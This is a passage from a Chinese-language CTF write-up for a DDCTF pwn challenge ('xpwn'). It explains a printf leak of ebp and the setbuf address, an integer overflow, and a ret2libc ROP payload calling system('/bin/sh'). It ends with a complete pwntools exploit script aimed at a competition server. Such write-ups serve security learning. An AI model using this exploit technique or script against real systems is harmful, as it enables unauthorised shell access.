0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p><p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li><li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li><li>如果还有什么不懂了，可以下方留言</li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/afd9f177/">https://noone-hub.github.io/posts/afd9f177/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 二进制</tag>
        <tag>栈</tag>
      </tags>
  </entry>
</search>
